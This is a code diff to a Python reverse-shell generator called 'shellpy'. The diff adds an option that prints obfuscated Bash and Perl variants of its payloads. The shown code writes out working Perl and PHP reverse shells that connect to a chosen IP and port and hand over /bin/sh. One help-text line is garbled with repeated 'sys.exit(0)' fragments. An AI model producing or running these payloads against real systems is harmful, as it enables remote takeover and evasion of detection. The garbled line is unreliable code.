@@ -8,6 +8,7 @@ import random
 import os
 import time
 import shutil
+from shobfuscator import obfuscateBash, obfuscatePerl
 from psobfuscator import (
     printR, printG, printY, printP,
     loadReserved, loadPSCommands, randomString,
@@ -434,11 +435,17 @@ def print_nishang(ip, port, use_macro, use_obfuscate):
 
 
 
-def print_perl(ip, port):
+def print_perl(ip, port, use_obfuscate=False):
 
     print("\n********** Perl **********\n")
     perl_payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
     print(perl_payload)
+
+    if use_obfuscate:
+        print("\n********** Perl obfuscated **********\n")
+        for name, variant in obfuscatePerl(perl_payload, ip, port):
+            print(f"[{name}]")
+            print(variant + "\n")
 
 
 def print_php(ip, port):
@@ -462,7 +469,7 @@ def print_php(ip, port):
 
     print(f"\nphp -r '$sock=fsockopen('{ip}',{port});exec('/bin/sh <&3 >&3 2>&3');'")
 
-def print_bash(ip, port):
+def print_bash(ip, port, use_obfuscate=False):
 
     print("\n\n\n********** Bash **********\n")
     bash_payloads = [
@@ -474,6 +481,17 @@ def print_bash(ip, port):
     ]
     for payload in bash_payloads:
         print(payload)
+
+    if use_obfuscate:
+        # The URL encoded copies are the same command, so obfuscating them
+        # would only repeat the output.
+        print("\n********** Bash obfuscated **********\n")
+        for payload in [bash_payloads[0], bash_payloads[2], bash_payloads[4]]:
+            print(f"# {payload}")
+            for name, variant in obfuscateBash(payload, ip, port):
+                print(f"[{name}]")
+                print(variant)
+            print("")
 
 
 def print_nc(ip, port):
@@ -518,6 +536,7 @@ def shellpy_help():
     print("\n\tUsage: shellpy <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro] [--obfuscate]")
     print("\n\tShells types: \n\n\t\t-Powershell \n\t\t-nishang \n\t\t-conpty \n\t\t-powercat \n\t\t-perl \n\t\t-nc \n\t\t-bash \n\t\t-php")
     print(f"\t\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
+    print(f"\t\t--obfuscate works with -powercat, -nishang, -powershell, -conpty, -bash and -perl.")
     print("\n\tExamples:\n")
     print(f"\t\tshellpy 192.168.1.72 4444 -php")
     print(f"\t\tshellpy 192.168.1.72 4444 -powershell")
@@ -648,7 +667,8 @@ def main(use_macro, use_obfuscate):
                 cols = int(sys.argv[5])
             except (IndexError, ValueError):
                 print("Usage: shell <IP> <PORT> <SHELL_TYPE> [--macro] [--obfuscate] ")
-                print("[--macro] [--obfuscate] are only available with powershell, nishang conpty and powercat")
+                print("[--macro] is only available with powershell, nishang, conpty and powercat")
+                print("[--obfuscate] also works with bash and perl")
                 print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0ipowercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
                 sys.exit(1)
         else:
@@ -656,8 +676,12 @@ def main(use_macro, use_obfuscate):
             rows, cols = map(int, output.split())
 
         if use_macro or use_obfuscate:
-            if shell_type not in ['-powercat', '-nishang', '-powershell', '-conpty']:
-                print("Error: --macro and --obfuscate can only be used with -powercat, -nishang, -powershell, or -conpty.")
+            if use_macro and shell_type not in ['-powercat', '-nishang', '-powershell', '-conpty']:
+                print("Error: --macro can only be used with -powercat, -nishang, -powershell, or -conpty.")
+                sys.exit(1)
+            if use_obfuscate and shell_type not in ['-powercat', '-nishang', '-powershell',
+                                                    '-conpty', '-bash', '-perl']:
+                print("Error: --obfuscate can only be used with -powercat, -nishang, -powershell, -conpty, -bash, or -perl.")
                 sys.exit(1)
 
        
@@ -675,9 +699,9 @@ def main(use_macro, use_obfuscate):
     elif shell_type == "-php":
         print_php(ip, port)
     elif shell_type == "-bash":
-        print_bash(ip, port)
+        print_bash(ip, port, use_obfuscate)
     elif shell_type == "-perl":
-        print_perl(ip, port)
+        print_perl(ip, port, use_obfuscate)
     elif shell_type == "-nc":
         print_nc(ip, port)
     else:
